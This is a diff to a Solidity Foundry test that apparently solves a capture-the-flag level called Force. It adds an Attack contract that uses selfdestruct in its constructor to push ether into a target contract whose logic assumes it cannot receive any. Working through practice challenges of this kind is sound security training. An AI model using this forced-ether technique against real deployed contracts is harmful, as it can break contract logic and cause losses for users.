@@ -39,7 +39,14 @@ contract TestForce is BaseTest {
         vm.startPrank(player, player);
 
         // Solve the Challenge
+        new Attack{value: 1}(levelAddress);
 
         vm.stopPrank();
+    }
+}
+
+contract Attack {
+    constructor(address _target) public payable {
+        selfdestruct(payable(_target));
     }
 }
